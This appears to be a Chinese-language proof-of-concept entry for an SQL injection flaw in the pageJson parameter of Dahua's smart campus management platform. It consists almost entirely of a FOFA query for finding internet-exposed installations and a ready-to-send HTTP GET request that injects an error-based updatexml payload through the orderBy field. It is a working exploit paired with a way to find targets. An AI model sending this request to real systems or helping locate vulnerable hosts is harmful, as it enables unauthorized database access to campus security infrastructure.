## 大华智慧园区综合管理平台pageJson存在SQL注入漏洞


## fofa
```
app="dahua-智慧园区综合管理平台"
```

## poc
```
GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```
